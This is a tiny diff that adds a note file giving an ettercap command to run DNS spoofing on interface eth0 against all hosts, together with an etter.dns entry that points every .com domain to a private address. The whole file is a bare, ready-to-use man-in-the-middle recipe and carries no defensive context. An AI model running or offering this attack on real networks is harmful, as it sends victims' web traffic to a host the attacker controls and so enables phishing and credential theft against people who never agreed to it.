@@ -1,0 +1,6 @@
+
+Commad : ettercap -T -q -i eth0 -P dns_spoof // //
+
+Configure : /usr/share/ettercap/etter.dns
+            *.com   A  192.168.x.x
+
